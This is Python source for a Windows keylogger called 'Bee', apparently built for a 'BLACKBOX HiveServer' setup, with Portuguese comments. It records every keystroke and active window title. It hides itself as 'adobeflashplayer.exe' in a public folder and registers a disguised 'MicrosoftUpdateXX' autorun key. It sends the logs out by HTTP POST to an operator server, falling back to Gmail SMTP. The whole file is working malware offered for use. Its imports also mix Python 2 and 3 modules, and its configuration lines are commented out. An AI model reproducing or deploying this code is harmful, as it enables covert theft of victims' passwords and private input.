#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Bee.py - Keylogger para BLACKBOX HiveServer
# Author: Guilherme Alexander
# https://github.com/Guilherme-alexander

import pythoncom
import pyHook
from os import path
from time import sleep
from threading import Thread
import urllib.request
import urllib.parse
import json
import smtplib
import datetime
import win32com.client
import win32event
import win32api
import winerror
from _winreg import *
import shutil
import sys
import socket
import os

# ============================================================
# CONFIGURAÇÕES INJETADAS PELO HIVESERVER
# ============================================================
# EEMAIL = "seu_email@gmail.com"
# EPASS = "sua_senha"
# SERVER_URL = "http://192.168.1.100:5000/log"
# ============================================================

# Verifica se já está rodando (Mutex)
try:
    ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        print("[!] Keylogger já está em execução!")
        sys.exit()
except:
    pass

# Variáveis globais
data_buffer = ''
lastWindow = ''
hostname = socket.gethostname()
start_time = datetime.datetime.now()

# Diretório para persistência
dir_path = r"C:\Users\Public\Libraries\adobeflashplayer.exe"

def startup():
    """Copia o executável para o diretório Public e adiciona ao registro"""
    try:
        shutil.copy(sys.argv[0], dir_path)
        aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(aKey, "MicrosoftUpdateXX", 0, REG_SZ, dir_path)
        CloseKey(aKey)
        CloseKey(aReg)
    except Exception as e:
        print(f"[-] Erro na persistência: {e}")

if not path.isfile(dir_path):
    startup()

def send_to_server():
    """Envia logs para o servidor central via HTTP POST"""
    global data_buffer
    while True:
        if len(data_buffer) > 30:
            try:
                # Prepara os dados
                payload = {
                    "hostname": hostname,
                    "data": data_buffer,
                    "timestamp": datetime.datetime.now().isoformat()
                }
                
                # Converte para JSON
                json_data = json.dumps(payload).encode('utf-8')
                
                # Cria requisição
                req = urllib.request.Request(
                    SERVER_URL,
                    data=json_data,
                    headers={'Content-Type': 'application/json'}
                )
                
                # Envia
                with urllib.request.urlopen(req, timeout=10) as response:
                    response_data = response.read().decode('utf-8')
                    print(f"[+] Log enviado ao servidor: {len(data_buffer)} caracteres")
                
                # Limpa buffer após envio bem-sucedido
                data_buffer = ''
                
            except Exception as error:
                print(f"[-] Erro ao enviar para servidor: {error}")
                # Tenta enviar por e-mail como fallback se configurado
                if 'EEMAIL' in globals() and 'EPASS' in globals():
                    send_email_fallback(data_buffer)
        
        sleep(120)  # Espera 2 minutos

def send_email_fallback(log_data):
    """Envia logs por e-mail como fallback (Python 3)"""
    try:
        if not log_data:
            return
            
        timeInSecs = datetime.datetime.now()
        SERVER = "smtp.gmail.com"
        PORT = 587
        USER = EEMAIL
        PASS = EPASS
        FROM = USER
        TO = [USER]
        SUBJECT = f"🐝 Bee Fallback: {timeInSecs.isoformat()}"
        
        # Cria mensagem
        message = f"""From: {FROM}
To: {', '.join(TO)}
Subject: {SUBJECT}

Host: {hostname}
Data: {log_data}
"""
        
        server = smtplib.SMTP(SERVER, PORT)
        server.starttls()
        server.login(USER, PASS)
        server.sendmail(FROM, TO, message.encode('utf-8'))
        server.quit()
        
        print(f"[+] Log enviado por e-mail (fallback)")
        
    except Exception as error:
        print(f"[-] Erro ao enviar e-mail fallback: {error}")

def pushing(event):
    """Callback para captura de teclas"""
    global data_buffer, lastWindow
    
    try:
        window = event.WindowName
        
        # Mapeamento de teclas especiais
        keys = {
            13: ' [ENTER] ',
            8: ' [BACKSPACE] ',
            162: ' [CTRL] ',
            163: ' [CTRL] ',
            164: ' [ALT] ',
            165: ' [ALT] ',
            160: ' [SHIFT] ',
            161: ' [SHIFT] ',
            46: ' [DELETE] ',
            32: ' [SPACE] ',
            27: ' [ESC] ',
            9: ' [TAB] ',
            20: ' [CAPSLOCK] ',
            38: ' [UP] ',
            40: ' [DOWN] ',
            37: ' [LEFT] ',
            39: ' [RIGHT] ',
            91: ' [SUPER] '
        }
        
        # Obtém o caractere ou nome da tecla
        keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii) if 32 <= event.Ascii <= 126 else f' [0x{event.Ascii:X}] ')
        
        # Adiciona ao buffer com informação da janela
        if window != lastWindow:
            lastWindow = window
            data_buffer += f' {{ {lastWindow} }} '
            data_buffer += keyboardKeyName
        else:
            data_buffer += keyboardKeyName
            
    except Exception as e:
        print(f"[-] Erro na captura: {e}")

def main():
    """Função principal do keylogger"""
    print("[+] Bee Keylogger iniciado!")
    print(f"[+] Hostname: {hostname}")
    print(f"[+] Servidor: {SERVER_URL if 'SERVER_URL' in globals() else 'Não configurado'}")
    
    # Inicia thread para enviar logs
    send_thread = Thread(target=send_to_server)
    send_thread.daemon = True
    send_thread.start()
    
    # Configura e inicia o hook do teclado
    try:
        hookManager = pyHook.HookManager()
        hookManager.KeyDown = pushing
        hookManager.HookKeyboard()
        
        print("[+] Hook do teclado instalado. Aguardando teclas...")
        pythoncom.PumpMessages()
        
    except Exception as e:
        print(f"[-] Erro no hook: {e}")
        # Tenta reiniciar o hook
        sleep(5)
        main()

if __name__ == '__main__':
    main()